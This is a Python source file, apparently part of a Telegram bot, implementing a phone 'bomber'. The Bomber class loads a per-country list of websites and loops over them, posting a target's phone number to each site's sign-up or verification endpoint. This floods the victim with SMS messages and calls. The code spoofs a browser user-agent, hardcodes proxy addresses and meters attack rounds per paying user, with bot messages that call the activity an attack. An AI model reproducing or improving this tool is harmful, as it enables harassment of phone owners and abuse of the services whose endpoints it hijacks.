import json
import random
import asyncio
import globals
import commands
import datetime
import traceback
from loguru import logger
from aiohttp import ClientSession
from db_models.User import data_users_table
from sqlalchemy import select

class Bomber:
    user_id:str
    def __init__(self, user_id):
        self.user_id:str = user_id
        self.session = ClientSession() #Подключение к сессии
        self.time:str = datetime.datetime.strftime(
                datetime.datetime.now(), "%d%m%Y%H%M%S"
                ) #Настоящее время
        self.response:list = random.sample(list(self.time), len(list(self.time)))
        self.names:list = [
                "Иван", "Василий", "Дмитрий", "Геннадий", "Алексей",\
                "Михаил", "Григорий", "Александр", "Андрей", "Артем",\
                "Павел", "Никита", "Анна", "Света", "Дарья",\
                "Кристина", "Екатерина", "Софья", "Виктория", "Анжела",\
                "Ангелина", "Людимла", "Нина", "Алина"
                ] #Список имен для генерации
                     
        self.user_agent:dict = {"User-agent":\
                           "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"+\
                           "AppleWebKit/537.36 (KHTML, like Gecko)"+\
                           "Chrome/77.0.3835.0 Safari/537.36"}

        self.proxies:list = [
                        "http://45.77.185.45:3128",       
                        "http://1.10.133.47:80",
                        "85.208.210.116:8085", 
                        "45.159.23.214:8085", 
                        "85.209.151.133:8085", 
                        "91.89.89.11:8080", 
                        "180.109.35.87:8060", 
                        "85.209.150.234:8085", 
                        "190.13.138.50:4153", 
                        "77.37.208.119:55491"
                       ] #Список прокси
        self.circle:int = 0
        self.state_seconds:int = 0
        self.process_status:bool = True

    async def start(self, phone, chat_id):

        my_circles = select([data_users_table.c.status]).where(data_users_table.c.user_id==chat_id)
        my_circles = globals.conn.execute(my_circles).fetchone()[0]

        if my_circles == "∞":self.state_seconds = "∞"
        else:self.state_seconds = int(my_circles)

        with open(r"sites/sites_%s.json" % globals.attack_country, "r", encoding="UTF-8") as all_sites:
            sites = json.loads(all_sites.read())
        
        while self.process_status:
            if self.state_seconds == "∞":pass
            else:
                self.state_seconds-=1
                if self.state_seconds == 0:
                    
                    update_data = data_users_table.update().values(
                        status=self.state_seconds
                    ).where(data_users_table.c.user_id==chat_id)
                    globals.conn.execute(update_data)
                    
                    await globals.bot.send_message(
                            chat_id,
                            text=f"⌛️Круги исчерпаны...")
                    return await self.session.close()
                    break

            if self.circle == 15:

                update_data = data_users_table.update().values(
                        status=self.state_seconds
                    ).where(data_users_table.c.user_id==chat_id)
                globals.conn.execute(update_data)

                await globals.bot.send_message(
                        chat_id,
                        text=f"⌛️Превышено время атаки... Не забывайте отключать атаку!\n"
                        f"⚙️Влияет на нагрузку памяти и процессора!")
                await self.session.close()
                break

            for v in sites.values():
                if "json" in list(v.keys()) and not v["format"]:
                    dct = v["json"]
                    dct[v["arg"]] = v["plus"]+phone
                    try:
                        async with self.session.post(
                            url=v["url"], 
                            json=dct,  
                            headers=self.user_agent
                        ) as resp:pass
                        await asyncio.sleep(1) 
                    except:pass

                elif "data" in list(v.keys()) and not v["format"]:
                    dct = v["data"]
                    dct[v["arg"]] = v["plus"]+phone
                    try:
                        async with self.session.post(
                            url=v["url"], 
                            data=dct,  
                            headers=self.user_agent
                        ) as resp:pass
                        await asyncio.sleep(1)
                    except:pass
                
                elif "params" in list(v.keys()) and not v["format"]:
                    dct = v["json"]
                    dct[v["arg"]] = v["plus"]+phone
                    try:
                        async with self.session.post(
                            url=v["url"], 
                            params=dct,  
                            headers=self.user_agent
                        ) as resp:pass
                        await asyncio.sleep(1)
                    except:pass

                else:
                    url = v["url"].format(phone)
                    try:
                        async with self.session.post(
                            url=url,  
                            headers=self.user_agent
                        ) as resp:pass
                        await asyncio.sleep(1)
                    except:pass

            self.circle+=1
            await asyncio.sleep(5)

    async def stop(self, chat_id):
        if self.state_seconds == "∞":pass
        else:
            update_data = data_users_table.update().values(
                status=self.state_seconds
            ).where(data_users_table.c.user_id==chat_id)
            globals.conn.execute(update_data)
        
        self.process_status = False
        await self.session.close()
        

def mask(str, maska):
    if len(str) == maska.count("#"):
        str_list=list(str)
        for i in str_list:
            maska=maska.replace("#", i, 1)
        return maska